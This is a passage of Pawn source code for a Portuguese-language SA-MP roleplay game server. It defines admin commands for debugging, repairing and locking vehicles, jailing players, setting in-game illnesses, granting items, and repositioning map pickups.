	    SendClientMessage(playerid, COLOR_INFO, "Debug desligado");

	    DebugStatus[playerid] = false;
	}

	return 1;
}

COMMAND:toggledebugkey(playerid, params[], help)
{
    if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if(DebugStatusKey[playerid] == false)
	{
	    SendClientMessage(playerid, COLOR_INFO, "Debug OnPlayerKeyStateChange ligado");

	    DebugStatusKey[playerid] = true;
	}
	else
	{
	    SendClientMessage(playerid, COLOR_INFO, "Debug OnPlayerKeyStateChange desligado");

	    DebugStatusKey[playerid] = false;
	}

	return 1;
}

COMMAND:toggledebuguj(playerid, params[], help)
{
    if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if(DebugStatusAdv[playerid] == false)
	{
	    SendClientMessage(playerid, COLOR_INFO, "Debug UpdateJogador ligado");

	    DebugStatusAdv[playerid] = true;
	}
	else
	{
	    SendClientMessage(playerid, COLOR_INFO, "Debug UpdateJogador desligado");

	    DebugStatusAdv[playerid] = false;
	}

	return 1;
}

COMMAND:desligarmotores(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);
    
	new string[128];
    
	DesligarMotores();
	
	format(string, sizeof(string), "O Administrador %s desligou os motores de todos os carros!", GetPlayerNameEx(playerid));
	SendClientMessageToAll(COLOR_INFO, string);

    return 1;
}

COMMAND:check(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid;

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/check <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	ShowStats(playerid, giveplayerid, 1);

    return 1;
}

COMMAND:uptime(playerid, params[], help)
{
    if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new string[128];

    format(string, sizeof(string), "[SERVER UPTIME:] {33CCFF}%d {FFFFFF}dias, {33CCFF}%d {FFFFFF}horas, {33CCFF}%d {FFFFFF}minutos, {33CCFF}%d {FFFFFF}segundos", UptimeDias, UptimeHoras, UptimeMinutos, UptimeSegundos);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:tt(playerid, params[], help)
{
    /*if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, reason[33], string[128];

    if(sscanf(params, "ds[32]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/t(irar)t(utorial) <playerid> <razão>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

    format(string, sizeof(string), "O jogador %s foi tirado do tutorial por %s. Razão: %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
    SendClientMessageToAll(COLOR_INFO, string);

	TogglePlayerSpectating(giveplayerid, false);
 	TogglePlayerControllable(giveplayerid, true);
 	
 	UnlockTutorial[giveplayerid] = true;
 	KillTimer(TimerUnlockTutorial[giveplayerid]);
 	
 	ShowPlayerDialog(giveplayerid, DIALOG_TT, DIALOG_STYLE_MSGBOX, "TUTORIAL", "{FFFFFF}Retiraram-te do tutorial.", "Ok", "");*/
 	
 	SendClientMessage(playerid, COLOR_CHAT, "Comando desabilitado");

	return 1;
}

COMMAND:mt(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, reason[33];
   	new sdialog[600];
	new string[300];

    if(sscanf(params, "ds[32]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/m(andar)t(utorial) <playerid> <razão>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    
    format(string, sizeof(string), "O jogador %s foi mandado para o tutorial por %s. Razão: %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
    SendClientMessageToAll(COLOR_INFO, string);
    
	format(string, sizeof(string), "{FFFFFF}Este servidor consiste em imitar a vida real ao máximo. Para isso precisas de fazer tudo o que normalmente uma pessoa"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{FFFFFF}normal faz. Tal como um cidadão normal e com pleno juízo, terés de trabalhar para te sustentares. Tens ao teu alcance várias maneiras de ganhar"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{FFFFFF}dinheiro, desde trabalhos até nas Factions (legais ou ilegais). Com este dinheiro que futuramente ganharás, poderás adquirir carros, casas,"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{FFFFFF}bens materiais, ir a festas e fazer tudo aquilo que te apetecer, respeitando sempre as regras do bom funcionamento do servidor."); strcat(sdialog,string);
	format(string, sizeof(string), "\n{FFFFFF}Mas lembra-te, tudo aquilo que não podes fazer na vida real também não podes fazer dentro do nosso servidor."); strcat(sdialog,string);
	format(string, sizeof(string), "\n{FFFFFF}Este é um pormenor importante do qual te deves sempre lembrar."); strcat(sdialog,string);

	KillTimer(TimerUnlockTutorial[giveplayerid]);
 	UnlockTutorial[giveplayerid] = false;
 	TimerUnlockTutorial[giveplayerid] = SetTimerEx("UnlockTutorials", 10000, false, "i", giveplayerid);
 	
 	TogglePlayerSpectating(giveplayerid, true);
 	TogglePlayerControllable(giveplayerid, false);
 	SetPlayerPosEx(giveplayerid, -831.1625,1629.0327,26.7540);

	return ShowPlayerDialog(giveplayerid, DIALOG_TUTORIAL1, DIALOG_STYLE_MSGBOX, "TUTORIAL - Em que consiste o servidor", sdialog, "Próximo", "Sair");
}

COMMAND:fixar(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new car = GetPlayerVehicleID(playerid);

	RepairVehicle(car);
	cInfo[car][Vida] = 1000;

    return 1;
}

COMMAND:fixjobcars(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new string[128];

    for(new c = 0; c < MAX_CARROS; c++)
    {
        if(c == 0) continue;
        
        if(cInfo[c][Type] == -1 || cInfo[c][Type] == -2) continue;

		RepairVehicle(c);
		cInfo[c][Vida] = 1000;
    }

    format(string, sizeof(string), "O Administrador %s fixou todos os carros de Job do servidor!", GetPlayerNameEx(playerid));
    SendClientMessageToAll(COLOR_INFO, string);

    return 1;
}

COMMAND:unlockjob(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new string[128];

    for(new c = 0; c < MAX_CARROS; c++)
    {
        if(cInfo[c][Type] == -1 || cInfo[c][Faction] == 0) continue;
        
		cInfo[c][Trancado] = 0;
    }

    format(string, sizeof(string), "O Administrador %s destrancou todos os carros de Job/Faction/Licenças do servidor!", GetPlayerNameEx(playerid));
    SendClientMessageToAll(COLOR_INFO, string);

    return 1;
}

COMMAND:unlockcars(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new string[128];

    for(new c = 0; c < MAX_CARROS; c++)
    {
		cInfo[c][Trancado] = 0;
    }

    format(string, sizeof(string), "O Administrador %s destrancou todos os carros do servidor!", GetPlayerNameEx(playerid));
    SendClientMessageToAll(COLOR_INFO, string);

    return 1;
}

COMMAND:lockcars(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new string[128];

    for(new c = 0; c < MAX_CARROS; c++)
    {
		cInfo[c][Trancado] = 1;
    }

    format(string, sizeof(string), "O Administrador %s trancou todos os carros do servidor!", GetPlayerNameEx(playerid));
    SendClientMessageToAll(COLOR_INFO, string);

    return 1;
}

COMMAND:setdoenca(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, doenca, string[128];

    if(sscanf(params, "dd", giveplayerid, doenca))
	{
	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/setdoenca <playerid> <doença>");
	    SendClientMessage(playerid, COLOR_CHAT, "[Doenças]: {FFFFFF}0: Saudével - 1: Gripe - 2: Infeção Urinária - 3: Dores de Barriga - 4: Ataques de Tosse");
	    
	    return 1;
	}
	
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(doenca < 0 || doenca > 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Doença inválida");

	switch(doenca)
	{
	    case 0:
	    {
			format(string, sizeof(string), "Retiraste as doenças ao jogador %s",  GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_INFO, string);
			format(string, sizeof(string), "O Administrador %s tirou-te as doenças", GetPlayerNameEx(giveplayerid));
			SendClientMessage(giveplayerid, COLOR_INFO, string);
			
			pInfo[giveplayerid][ReceitaMedica] = 0;
			pInfo[giveplayerid][Medicamentos] = 0;
			pInfo[giveplayerid][MedicamentosTomados] = 0;
	    }
	    case 1:
	    {
			format(string, sizeof(string), "Setaste a doença Gripe no jogador %s", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_INFO, string);
			format(string, sizeof(string), "O Administrador %s deu-te a doença Gripe", GetPlayerNameEx(giveplayerid));
			SendClientMessage(giveplayerid, COLOR_INFO, string);
	    }
	    case 2:
	    {
			format(string, sizeof(string), "Setaste a doença Gripe no jogador %s", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_INFO, string);
			format(string, sizeof(string), "O Administrador %s deu-te a doença Infeção Urinária", GetPlayerNameEx(giveplayerid));
			SendClientMessage(giveplayerid, COLOR_INFO, string);
	    }
	    case 3:
	    {
			format(string, sizeof(string), "Setaste a doença Gripe no jogador %s", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_INFO, string);
			format(string, sizeof(string), "O Administrador %s deu-te a doença Dores de Barriga", GetPlayerNameEx(giveplayerid));
			SendClientMessage(giveplayerid, COLOR_INFO, string);
	    }
	    case 4:
	    {
			format(string, sizeof(string), "Setaste a doença Gripe no jogador %s", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_INFO, string);
			format(string, sizeof(string), "O Administrador %s deu-te a doença Ataques de tosse", GetPlayerNameEx(giveplayerid));
			SendClientMessage(giveplayerid, COLOR_INFO, string);
	    }
	}
	
	pInfo[giveplayerid][Doenca] = doenca;
	    
    return 1;
}

COMMAND:curar(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/curar <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    
    new Float:x, Float:y, Float:z;
    
    TogglePlayerControllable(playerid, true);
	
	pInfo[giveplayerid][Morto] = 0;
	pInfo[giveplayerid][MorteX] = 0;
	pInfo[giveplayerid][MorteY] = 0;
	pInfo[giveplayerid][MorteZ] = 0;
	pInfo[giveplayerid][MorteVirtualWorld] = 0;
	pInfo[giveplayerid][MorteInterior] = 0;
	
	GetPlayerPos(giveplayerid, x, y, z);
	SetPlayerHealthEx(giveplayerid, 50, 0);
	SetPlayerPosEx(giveplayerid, x, y, z);

    format(string, sizeof(string), "Curaste o jogador %s", GetPlayerNameEx(giveplayerid));
    SendClientMessage(playerid, COLOR_INFO, string);
    
    GameTextForPlayer(giveplayerid, "~r~Foste curado", 2000, 3);

    return 1;
}

COMMAND:dareuro(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new string[128];

	Euromilhoes();

    format(string, sizeof(string), "O Administrador %s deu um Euromilhões a toda a gente. Não se esqueçam de lhe agradecer!", GetPlayerNameEx(playerid));
    SendClientMessageToAll(COLOR_INFO, string);

    return 1;
}

COMMAND:darpaycheck(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new string[128];

    foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;

		PayDay(i);
    }
    
    format(string, sizeof(string), "O Administrador %s deu um PayCheck a toda a gente. Não se esqueçam de lhe agradecer!", GetPlayerNameEx(playerid));
    SendClientMessageToAll(COLOR_INFO, string);

    return 1;
}

COMMAND:aj(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, time, reason[32], string[128];

    if(sscanf(params, "dds[32]", giveplayerid, time, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/aj <playerid> <minutos> <razão>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    
	if(time != 0)
	{
    	format(string, sizeof(string), "%s foi de Admin Jail %d minutos por %s. Razão: %s.", GetPlayerNameEx(giveplayerid), time, GetPlayerNameEx(playerid), reason);
    	SendClientMessageToAll(COLOR_CHAT, string);
    	
		pInfo[giveplayerid][Jailed] = 1;
		pInfo[giveplayerid][JailTime] = time*60;
		ResetPlayerWeapons(giveplayerid);
		
		SetPlayerInterior(giveplayerid, 0);
		SetPlayerVirtualWorld(giveplayerid,0);
		SetPlayerPosEx(giveplayerid, AJx, AJy, AJz);
		
		pInfo[giveplayerid][AJCounter]++;
		sStats[0][AJs]++;
	}
	else
	{
    	format(string, sizeof(string), "%s foi retirado do Admin Jail por %s. Razão: %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
    	SendClientMessageToAll(COLOR_CHAT, string);
    	
		pInfo[giveplayerid][Jailed] = 0;
		pInfo[giveplayerid][JailTime] = 0;
		
		SpawnarJogador(giveplayerid);
		pInfo[giveplayerid][AJCounter]--;
	}

    return 1;
}

COMMAND:adarmateriais(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, materiais, string[128];

    if(sscanf(params, "dd", giveplayerid, materiais)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/adarmateriais <playerid> <materiais>");
    if(materiais <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Drogas inválidas");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	pInfo[giveplayerid][Materiais] = materiais;

    format(string, sizeof(string), "Deste %d materiais ao jogador %s", materiais, GetPlayerNameEx(giveplayerid));
    SendClientMessage(playerid, COLOR_INFO, string);
    format(string, sizeof(string), "O Administrador %s deu-te %d materiais", GetPlayerNameEx(playerid), materiais);
    SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:adardrogas(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, drogas, string[128];

    if(sscanf(params, "dd", giveplayerid, drogas)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/adardrogas <playerid> <drogas>");
    if(drogas <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Drogas inválidas");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	pInfo[giveplayerid][Drogas] = drogas;

    format(string, sizeof(string), "Deste %d drogas ao jogador %s", drogas, GetPlayerNameEx(giveplayerid));
    SendClientMessage(playerid, COLOR_INFO, string);
    format(string, sizeof(string), "O Administrador %s deu-te %d drogas", GetPlayerNameEx(playerid), drogas);
    SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:adararma(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, arma, ammo, string[128];

    if(sscanf(params, "ddd", giveplayerid, arma, ammo)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/adararma <playerid> <arma> <munição>");
    if(arma <= 0 || arma > 46) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Arma inválida");
    if(ammo <= 0 || ammo > 999) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Munição inválida");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    
    GivePlayerWeapon(giveplayerid, arma, ammo);

    format(string, sizeof(string), "Tu deste ao jogador %s a arma %d com %d balas", GetPlayerNameEx(giveplayerid), arma, ammo);
    SendClientMessage(playerid, COLOR_INFO, string);
    format(string, sizeof(string), "O Administrador %s deu-te a arma %d com %d balas", GetPlayerNameEx(playerid), arma, ammo);
    SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:setskin(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 3) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new giveplayerid, skin, string[128];

    if(sscanf(params, "dd", giveplayerid, skin)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/setskin <playerid> <skin>");
    if(skin <= 0 || skin > 312) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Skin inválida");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	pInfo[giveplayerid][Skin] = skin;
	SetPlayerSkin(giveplayerid, skin);

    format(string, sizeof(string), "Alteraste a skin do jogador %s para %d", GetPlayerNameEx(giveplayerid), skin);
    SendClientMessage(playerid, COLOR_INFO, string);
    format(string, sizeof(string), "O Administrador %s setou a tua skin para %d", GetPlayerNameEx(playerid), skin);
    SendClientMessage(giveplayerid, COLOR_INFO, string);

    return 1;
}

COMMAND:apositioncmds(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de POSIÇÕES:] {FFFFFF}/aconducaopos - /aprenderpos - /acepos");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de POSIÇÕES:] {FFFFFF}/acomprardrogapos - /aentregardrogaspos - /atuningpos");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de POSIÇÕES:] {FFFFFF}/abankpos - /apoliciapos - /aapreendidosentradapos - /aapreendidospos");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de POSIÇÕES:] {FFFFFF}/avendercarropos - /acamaramunicipalpos - /aaeroportopos");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de POSIÇÕES:] {FFFFFF}/alotapos - /aiscopos - /afabricapos");
    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");

    return 1;
}

COMMAND:afabricapos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

 	DestroyDynamicPickup(FabricaPickup);
  	DestroyDynamic3DTextLabel(FabricaLabel);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][FabricaX] = x;
	oInfo[0][FabricaY] = y;
	oInfo[0][FabricaZ] = z;
	oInfo[0][FabricaVirtualWorld] = VW;
	oInfo[0][FabricaInterior] = Int;

	FabricaPickup = CreateDynamicPickup(oInfo[0][FabricaPickupID], 1, oInfo[0][FabricaX], oInfo[0][FabricaY], oInfo[0][FabricaZ], -1, -1, -1, 100.0);
	FabricaLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Fábrica {99FF00}] \n{99FF00}'/comprarprodutos'", COLOR_WHITE, oInfo[0][FabricaX], oInfo[0][FabricaY], oInfo[0][FabricaZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de Comprar Produtos para ti");

    return 1;
}

COMMAND:aiscopos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

 	DestroyDynamicPickup(IscoPickup);
  	DestroyDynamic3DTextLabel(IscoLabel);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][ComprarIscoX] = x;
	oInfo[0][ComprarIscoY] = y;
	oInfo[0][ComprarIscoZ] = z;
	oInfo[0][ComprarIscoVirtualWorld] = VW;
	oInfo[0][ComprarIscoInterior] = Int;

	IscoPickup = CreateDynamicPickup(oInfo[0][ComprarIscoPickupID], 1, oInfo[0][ComprarIscoX], oInfo[0][ComprarIscoY], oInfo[0][ComprarIscoZ], -1, -1, -1, 100.0);
	IscoLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Loja da Lota {99FF00}] \n{99FF00}'/comprarisco'", COLOR_WHITE, oInfo[0][ComprarIscoX], oInfo[0][ComprarIscoY], oInfo[0][ComprarIscoZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de Comprar Isco para ti");

    return 1;
}

COMMAND:alotapos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

 	DestroyDynamicPickup(LotaPickup);
  	DestroyDynamic3DTextLabel(LotaLabel);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][LotaX] = x;
	oInfo[0][LotaY] = y;
	oInfo[0][LotaZ] = z;
	oInfo[0][LotaVirtualWorld] = VW;
	oInfo[0][LotaInterior] = Int;

	LotaPickup = CreateDynamicPickup(oInfo[0][LotaPickupID], 1, oInfo[0][LotaX], oInfo[0][LotaY], oInfo[0][LotaZ], -1, -1, -1, 100.0);
	LotaLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Lota {99FF00}] \n{99FF00}'/venderpeixe'", COLOR_WHITE, oInfo[0][LotaX], oInfo[0][LotaY], oInfo[0][LotaZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição da Lota para ti");

    return 1;
}

COMMAND:aaeroportopos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

 	DestroyDynamicPickup(AeroportoPickup);
  	DestroyDynamic3DTextLabel(AeroportoLabel);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][AeroportoX] = x;
	oInfo[0][AeroportoY] = y;
	oInfo[0][AeroportoZ] = z;
	oInfo[0][AeroportoVirtualWorld] = VW;
	oInfo[0][AeroportoInterior] = Int;

	AeroportoPickup = CreateDynamicPickup(oInfo[0][AeroportoPickupID], 1, oInfo[0][AeroportoX], oInfo[0][AeroportoY], oInfo[0][AeroportoZ], -1, -1, -1, 100.0);
	AeroportoLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Aeroporto 100$ {99FF00}]\n'/comprarbilhete'", COLOR_WHITE, oInfo[0][AeroportoX], oInfo[0][AeroportoY], oInfo[0][AeroportoZ], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição do Aeroporto para ti");

    return 1;
}

COMMAND:acamaramunicipalpos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

 	DestroyDynamicPickup(CamaraMunicipalPickup);
  	DestroyDynamic3DTextLabel(CamaraMunicipalLabel);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][CamaraMunicipalX] = x;
	oInfo[0][CamaraMunicipalY] = y;
	oInfo[0][CamaraMunicipalZ] = z;
	oInfo[0][CamaraMunicipalVirtualWorld] = VW;
	oInfo[0][CamaraMunicipalInterior] = Int;

	CamaraMunicipalPickup = CreateDynamicPickup(oInfo[0][CamaraMunicipalPickupID], 1, oInfo[0][CamaraMunicipalX], oInfo[0][CamaraMunicipalY], oInfo[0][CamaraMunicipalZ], -1, -1, -1, 100.0);
	CamaraMunicipalLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Câmara Municipal {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][CamaraMunicipalX], oInfo[0][CamaraMunicipalY], oInfo[0][CamaraMunicipalZ], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição da Câmara Municipal para ti");

    return 1;
}

COMMAND:avendercarropos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

  	DestroyDynamic3DTextLabel(VenderVeiculoLabel);

	new Float:x, Float:y, Float:z;

	GetPlayerPos(playerid, x, y, z);

	oInfo[0][VenderVeiculoX] = x;
	oInfo[0][VenderVeiculoY] = y;
	oInfo[0][VenderVeiculoZ] = z;

	VenderVeiculoLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}/venderveiculo {99FF00}]", COLOR_WHITE, oInfo[0][VenderVeiculoX], oInfo[0][VenderVeiculoY], oInfo[0][VenderVeiculoZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição de Vender Veículos para ti");

    return 1;
}

COMMAND:aapreendidosentradapos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new Float:x, Float:y, Float:z, Float:a, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);
	
	oInfo[0][EntradaApreendidosX] = x;
	oInfo[0][EntradaApreendidosY] = y;
	oInfo[0][EntradaApreendidosZ] = z;
	oInfo[0][EntradaApreendidosA] = a;
	oInfo[0][EntradaApreendidosVirtualWorld] = VW;
	oInfo[0][EntradaApreendidosInterior] = Int;

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição da entrada da Garagem dos Apreendidos para ti");

    return 1;
}

COMMAND:aapreendidospos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new Float:x, Float:y, Float:z, Float:a, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][ApreendidosX] = x;
	oInfo[0][ApreendidosY] = y;
	oInfo[0][ApreendidosZ] = z;
	oInfo[0][ApreendidosA] = a;
	oInfo[0][ApreendidosVirtualWorld] = VW;
	oInfo[0][ApreendidosInterior] = Int;

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição da Garagem dos Apreendidos para ti");

    return 1;
}

COMMAND:apoliciapos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

 	DestroyDynamicPickup(PoliciaPickup);
  	DestroyDynamic3DTextLabel(PoliciaLabel);

	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	oInfo[0][PoliciaX] = x;
	oInfo[0][PoliciaY] = y;
	oInfo[0][PoliciaZ] = z;
	oInfo[0][PoliciaVirtualWorld] = VW;
	oInfo[0][PoliciaInterior] = Int;

	PoliciaPickup = CreateDynamicPickup(oInfo[0][PoliciaPickupID], 1, oInfo[0][PoliciaX], oInfo[0][PoliciaY], oInfo[0][PoliciaZ], -1, -1, -1, 100.0);
	PoliciaLabel = CreateDynamic3DTextLabel("{99FF00}[ {FFFFFF}Balcão PSP {99FF00}]\n 'n'", COLOR_WHITE, oInfo[0][PoliciaX], oInfo[0][PoliciaY], oInfo[0][PoliciaZ], 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	SendClientMessage(playerid, COLOR_CHAT, "Puxaste a posição do Balcão da PSP para ti");

    return 1;
}

COMMAND:abankpos(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new id;

